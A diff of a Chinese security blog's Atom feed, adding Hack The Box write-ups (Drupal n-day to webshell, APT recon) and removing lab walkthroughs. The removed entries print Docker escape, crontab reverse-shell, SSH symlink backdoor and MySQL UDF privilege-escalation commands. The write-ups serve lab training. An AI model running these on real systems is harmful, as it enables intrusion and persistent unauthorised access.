@@ -6,7 +6,7 @@
   <link href="https://syst1m.top/atom.xml" rel="self"/>
   
   <link href="https://syst1m.top/"/>
-  <updated>2023-05-16T08:54:38.524Z</updated>
+  <updated>2023-07-03T08:33:14.235Z</updated>
   <id>https://syst1m.top/</id>
   
   <author>
@@ -15,6 +15,58 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>htb打靶-Bastard</title>
+    <link href="https://syst1m.top/2023/07/03/htb%E6%89%93%E9%9D%B6-Bastard/"/>
+    <id>https://syst1m.top/2023/07/03/htb%E6%89%93%E9%9D%B6-Bastard/</id>
+    <published>2023-07-03T03:17:09.000Z</published>
+    <updated>2023-07-03T08:33:14.235Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -sC -O 10.129.10.80          </span><br></pre></td></tr></table></figure><p>开放了80,135,重点显然是在web上面了</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031137335.png" alt="image-20230703113702787"></p><p>查看首页,drupal cms<img src="https://raw.githubusercontent.com/chencicici/images/main/202307031138332.png" alt="image-20230703113853299"></p><p>google一下找到专用扫描器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/immunIT/drupwn</span><br></pre></td></tr></table></figure><p>给出了版本7.54但是发现扫不出,换工具!</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031307946.png" alt="image-20230703130700889"></p><h1 id="nday利用"><a href="#nday利用" class="headerlink" title="nday利用"></a>nday利用</h1><p>换searchsploit寻找nday</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031328547.png" alt="image-20230703132821489"></p><p>-m 编号,下载到当前目录,修改对应内容</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031340928.png" alt="image-20230703134008900"></p><p>执行发现少一个扩展</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031340450.png" alt="image-20230703134031415"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php-curl</span><br></pre></td></tr></table></figure><p>发现利用不成功</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031349688.png" alt="image-20230703134905651"></p><p>google继续跟进这个exp,找到解释<a href="https://vk9-sec.com/drupal-7-x-module-services-remote-code-execution/">https://vk9-sec.com/drupal-7-x-module-services-remote-code-execution/</a></p><p>原来还需要找到这个路径</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031350600.png" alt="image-20230703135030563"></p><p>确认存在,修改exp</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031351923.png" alt="image-20230703135134883"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031352601.png" alt="image-20230703135208562"></p><p>利用成功,返回webshell路径</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031353934.png" alt="image-20230703135327900"></p><p>命令执行</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031354170.png" alt="image-20230703135422132"></p><h1 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h1><p>将靶机上线到msf</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031632376.png" alt="image-20230703163237335"></p>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;nmap -sV -sT -sC -O 10.129.10.80          &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;开放了80,135,重点显然是在web上面了&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202307031137335.png&quot; alt=&quot;image-20230703113702787&quot;&gt;&lt;/p&gt;
+&lt;p&gt;查看首页,drupal cms&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202307031138332.png&quot; alt=&quot;image-20230703113853299&quot;&gt;&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
+    
+    
+    <category term="hackthebox" scheme="https://syst1m.top/tags/hackthebox/"/>
+    
+    <category term="域渗透" scheme="https://syst1m.top/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>htb打靶-apt</title>
+    <link href="https://syst1m.top/2023/06/07/htb%E6%89%93%E9%9D%B6-apt/"/>
+    <id>https://syst1m.top/2023/06/07/htb%E6%89%93%E9%9D%B6-apt/</id>
+    <published>2023-06-07T02:33:24.000Z</published>
+    <updated>2023-06-08T06:48:24.146Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Hackthebox名为APT靶机的域渗透，即动态目录渗透，Insane级别即疯狂难度级别</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>连接上vpn后的攻击机ip</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306071038755.png" alt="image-20230607103822712"></p><p>ping一下测试靶机是否通</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306071039707.png" alt="image-20230607103929681"></p><h2 id="nmap端口信息收集"><a href="#nmap端口信息收集" class="headerlink" title="nmap端口信息收集"></a>nmap端口信息收集</h2><p>同时进行tcp和udp的全端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 10000 -p- 10.129.96.60</span><br><span class="line">nmap --min-rate 10000 -p- -sU 10.129.96.60</span><br><span class="line">-sU <span class="comment">#udp扫描</span></span><br><span class="line">--min-rate <span class="comment"># 最小速率</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306071052253.png" alt="image-20230607105207228"></p><p>扫描结果中没有udp端口,对tcp端口做进一步扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -sC -p 135,80 -O 10.129.96.60</span><br><span class="line">-sC <span class="comment">#使用默认脚本</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306071102490.png" alt="image-20230607110246463"></p><p>继续做漏洞脚本扫描,没东西</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306071137113.png" alt="image-20230607113708075"></p><h2 id="web信息收集-无价值-可跳过"><a href="#web信息收集-无价值-可跳过" class="headerlink" title="web信息收集(无价值,可跳过)"></a>web信息收集(无价值,可跳过)</h2><p>访问80端口看看有没有突破口</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306071107269.png" alt="image-20230607110740223"></p><p>爆一下目录,没发现什么有价值的东西</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://10.129.96.60 -w /usr/share/dirb/wordlists/common.txt -t 100</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306071112242.png" alt="image-20230607111216208"></p><p>&#x2F;js访问403,继续翻找源码,在源码里找到两个关键信息</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.透露出一个<span class="built_in">ip</span> 但是无法访问</span><br><span class="line"><span class="number">2</span>.透露出这站是由 HTTrack Website Copier这个框架镜像出来的,那么我们对这个网站sql.xss测试都没有用</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306081050835.png" alt="image-20230608105053578"></p><p>寻找 HTTrack Website Copier 的相关利用,翻译一下是一个堆栈利用漏洞,没用用处,因为无法直接操作这个应用,继续翻找其他漏洞,也都无法直接利用 </p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306081100364.png" alt="image-20230608110058331"></p><h2 id="135端口信息收集"><a href="#135端口信息收集" class="headerlink" title="135端口信息收集"></a>135端口信息收集</h2><p>80端口无法利用,把突破口转向135端口</p><p>135端口信息</p><p><a href="https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc">https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc</a></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306081118430.png" alt="image-20230608111838396"></p><p>使用rpcclient尝试连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpcclient 10.129.96.60 -p 135 <span class="comment">#需要指定端口为135,因为rpc默认端口为139</span></span><br></pre></td></tr></table></figure><p>连接失败</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306081124189.png" alt="image-20230608112415164"></p><p>使用impacket工具包,先添加环境变量 impacket工具包详解 <a href="https://xz.aliyun.com/t/11877">https://xz.aliyun.com/t/11877</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/usr/share/doc/python3-impacket/examples:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p>使用impacket工具包中的rpcdump.py</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306081448815.png" alt="image-20230608144809783"></p>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;Hackthebox名为APT靶机的域渗透，即动态目录渗透，Insane级别即疯狂难度级别&lt;/p&gt;
+&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;连接上vpn后的攻击机ip&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202306071038755.png&quot; alt=&quot;image-20230607103822712&quot;&gt;&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
+    
+    
+    <category term="hackthebox" scheme="https://syst1m.top/tags/hackthebox/"/>
+    
+    <category term="域渗透" scheme="https://syst1m.top/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
   
   <entry>
     <title>python bypss 第二弹</title>
@@ -61,9 +113,9 @@
     <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
     
     
-    <category term="红队" scheme="https://syst1m.top/tags/%E7%BA%A2%E9%98%9F/"/>
-    
     <category term="域渗透" scheme="https://syst1m.top/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
+    
+    <category term="红队" scheme="https://syst1m.top/tags/%E7%BA%A2%E9%98%9F/"/>
     
     <category term="多层内网" scheme="https://syst1m.top/tags/%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91/"/>
     
@@ -87,9 +139,9 @@
     <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
     
     
-    <category term="红队" scheme="https://syst1m.top/tags/%E7%BA%A2%E9%98%9F/"/>
-    
     <category term="域渗透" scheme="https://syst1m.top/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
+    
+    <category term="红队" scheme="https://syst1m.top/tags/%E7%BA%A2%E9%98%9F/"/>
     
     <category term="多层内网" scheme="https://syst1m.top/tags/%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91/"/>
     
@@ -495,62 +547,6 @@
     <category term="ATT&amp;CK" scheme="https://syst1m.top/tags/ATT-CK/"/>
     
     <category term="内网渗透" scheme="https://syst1m.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ATT&amp;CK红队实战靶场04</title>
-    <link href="https://syst1m.top/2022/08/16/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA04/"/>
-    <id>https://syst1m.top/2022/08/16/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA04/</id>
-    <published>2022-08-16T03:10:25.000Z</published>
-    <updated>2022-08-17T02:51:06.000Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>账号密码</p><ul><li>web ubuntu:ubuntu     </li><li>域成员 douser:Dotest123 </li><li>DC administrator:Test2008</li></ul><p>环境为kali复制物理网络，ubuntu复制物理网络&#x2F;仅主机，其余都为仅主机</p><h1 id="拓补图"><a href="#拓补图" class="headerlink" title="拓补图"></a>拓补图</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161117759.png"></p><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><p>对ubuntu进行扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161124388.png"></p><h2 id="S2"><a href="#S2" class="headerlink" title="S2"></a>S2</h2><p>挨个访问，2001端口根据title可以看到是Struts2框架</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161126930.png"></p><p>掏出检测工具,存在漏洞</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161138940.png"></p><p>exp直接拿下root权限</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161153328.png"></p><h2 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h2><p>2002端口tomcat，想war写马但是403</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161128199.png"></p><p>检测到存在cve-2017-12615</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161201997.png"></p><h2 id="phpmyadmin"><a href="#phpmyadmin" class="headerlink" title="phpmyadmin"></a>phpmyadmin</h2><p>2003端口phpmyadmin未授权,首先想到的是写通过日志写马，但是没有权限</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161128518.png"></p><p>网上找到4.8.1版本存在文件包含漏洞，可以通过写入缓存文件来getshell</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161224429.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161237172.png"></p><p>复现连接<a href="https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2018-12613/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2018-12613/README.zh-cn.md</a></p><p>然后在test库中查询，写入session缓存，然后再包含这个session文件来getshell，不知道为什么我本地根本没有生成这个session文件，已经拿到两个root权限的shell，不影响</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161314665.png"></p><h2 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h2><p>根据拿到的shell收集信息</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161321337.png"></p><p>判断是否为docker环境</p><p>ls -alh &#x2F;.dockerenv #查看是否存dockerrnv文件<br>cat &#x2F;proc&#x2F;1&#x2F;cgroup #查看系统进程的cgroup信息</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161321490.png"></p><p>此处利用特权模式逃逸，创建容器时通过添加–privileged&#x3D;true参数，将容器以特权模式起动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd --name privilegeTest –-privileged=<span class="literal">true</span> mongo:3.6-streth</span><br></pre></td></tr></table></figure><p> 特权模式起动的容器，实战可通过cat &#x2F;proc&#x2F;self&#x2F;status |grep Cap命令判断当前容器是否通过特权模式起（000000xfffffffff代表为特权模式起）这里tomcat容器是特权模式启动的</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161431272.png"></p><p>fdisk -l #查看磁盘文件<br>mkdir &#x2F;chan #新建一个目录用于挂载<br>mount &#x2F;dev&#x2F;sda1 &#x2F;chan #将宿主机&#x2F;dev&#x2F;sda1目录挂载到容器内</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161433483.png"></p><p>再利用计划任务反弹shell，这种半交互式shell，走web协议在写计划任务的时候会有很多转义问题，直接写webshell到根目录也出各种问题，于是用kali起了一个web服务把webshell放进去，让这个tomcat容器去下载</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161511233.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161511479.png"></p><h2 id="计划任务反弹shell"><a href="#计划任务反弹shell" class="headerlink" title="计划任务反弹shell"></a>计划任务反弹shell</h2><p>写入反弹语句</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161517957.png"></p><p>写到计划任务里</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;$a*/1 *    * * *    root  bash /tmp/shell.sh &#x27;</span> /chan/etc/crontab </span><br><span class="line"><span class="built_in">cat</span> /chan/etc/crontab</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161521524.png"></p><p>kali成功收到会话</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161521969.png"></p><p>构造ssh软连接后门，做权限维持</p><p>软连后门需要root执行后门命令，任意密码登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oport=12345</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161604297.png"></p><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>发现有两张网卡</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161522665.png"></p><p>弹一个会话到msf上，方便内网渗透,直接用msf自带的webshell比去生成后门再上传方便很多，</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161540400.png"></p><p>将生成的连接复制到刚刚返弹的shell中执行</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161540889.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161542230.png"></p><p>拿到会话</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161543354.png"></p><p>添加到40网段的路由</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161547033.png"></p><p>使用kali自带的模块再对40网段存活主机进行扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161617099.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161618476.png"></p><p>再进行端口探测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161622111.png"></p><h2 id="内网打点"><a href="#内网打点" class="headerlink" title="内网打点"></a>内网打点</h2><p>开放了445端口尝试17010，这里要创建一个正向连接的payload，因为我们无法直接与靶机通信，反向连接的话靶机无法连接到kali</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208161628372.png"></p><p>ms17-010打过去不返回会话，不知道管理员密码，作弊直接上去反弹shell，是域用户不是system运行不了mimikatz</p><p>直接寄了，后面的流程就是打到域用户，然后抓取hash制作TGT票据，然后用ms14-068打到域控，制作黄金票据维持权限</p>]]></content>
-    
-    
-    <summary type="html">&lt;h1 id=&quot;基本信息&quot;&gt;&lt;a href=&quot;#基本信息&quot; class=&quot;headerlink&quot; title=&quot;基本信息&quot;&gt;&lt;/a&gt;基本信息&lt;/h1&gt;&lt;p&gt;账号密码&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;web ubuntu:ubuntu     &lt;/li&gt;
-&lt;li&gt;域成员 douser:Dotest123 &lt;/li&gt;
-&lt;li&gt;DC administrator:Test2008&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;环境为kali复制物理网络，ubuntu复制物理网络&amp;#x2F;仅主机，其余都为仅主机&lt;/p&gt;
-&lt;h1 id=&quot;拓补图&quot;&gt;&lt;a href=&quot;#拓补图&quot; class=&quot;headerlink&quot; title=&quot;拓补图&quot;&gt;&lt;/a&gt;拓补图&lt;/h1&gt;</summary>
-    
-    
-    
-    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
-    
-    
-    <category term="ATT&amp;CK" scheme="https://syst1m.top/tags/ATT-CK/"/>
-    
-    <category term="内网渗透" scheme="https://syst1m.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>vulnhub-Raven2打靶</title>
-    <link href="https://syst1m.top/2022/08/13/vulnhub-Raven2%E6%89%93%E9%9D%B6/"/>
-    <id>https://syst1m.top/2022/08/13/vulnhub-Raven2%E6%89%93%E9%9D%B6/</id>
-    <published>2022-08-13T10:12:55.000Z</published>
-    <updated>2022-08-14T03:24:54.000Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>对靶机进行端口扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131816114.png"></p><p>扫一下目录，扫到一个目录遍历</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131827969.png"></p><p>拿到第一个flag</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131829833.png"></p><p>找到版本信息 phpmailer5.2.16</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131830372.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="web打点"><a href="#web打点" class="headerlink" title="web打点"></a>web打点</h2><p>根据版本信息找一下利用文件</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131832070.png"></p><p>-m id 下载到本地</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131843406.png"></p><p>修改脚本</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131854768.png"></p><p>再起一个终端监听</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131850579.png"></p><p>使用python运行脚本，访问后门</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131904663.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131904435.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131905706.png"></p><p>用py返回一个半交互式shell，找到第二个flag</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141044792.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>linux提权三板斧，suid，sudo无密码，内核皆无果</p><p>尝试其他方式，看看网站配置文件wp-config.php，找到mysql密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141048058.png"></p><p>有mysql的root账号我们可以使用udf提权，但是需要secure_file_priv的值不为null或者不做限制</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141052878.png"></p><p>没有导入导出限制，查看mysql版本和主机版本、架构</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141055131.png"></p><p>下载利用文件来提权</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141107997.png"></p><p>编译下载好的利用文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -c 1518.c</span><br><span class="line">gcc -g -shared -Wl,-soname,raptor_udf2.so -o 1.so 1518.o -lc</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141108499.png"></p><p>再在kali用python起一个web服务，靶机下载利用到本地提权</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141112443.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141113459.png"></p><p>进入mysql，构造自定义函数，给find一个s权限也就是suid</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">create table foo(line blob);</span><br><span class="line">insert into foo values(load_file(&#x27;/tmp/111.so&#x27;));   //上传到哪就写哪</span><br><span class="line">select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/111.so&#x27;;   //这个和上一行不是一个路径嗷，要根据前面进程列出来的plugin目录进行改动（一般就是这个）</span><br><span class="line">create function do_system returns integer soname &#x27;111.so&#x27;;     //创建 do_system 函数调用</span><br><span class="line">select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);     //给find命令赋予suid权限</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141120336.png"></p><p>退出mysql，利用find返回一个shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -<span class="built_in">exec</span> /bin/sh \;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141123993.png"></p>]]></content>
-    
-    
-    <summary type="html">&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;对靶机进行端口扫描&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202208131816114.png&quot;&gt;&lt;/p&gt;
-&lt;p&gt;扫一下目录，扫到一个目录遍历&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202208131827969.png&quot;&gt;&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
-    
-    
-    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
-    
-    <category term="udf提权" scheme="https://syst1m.top/tags/udf%E6%8F%90%E6%9D%83/"/>
     
   </entry>
   
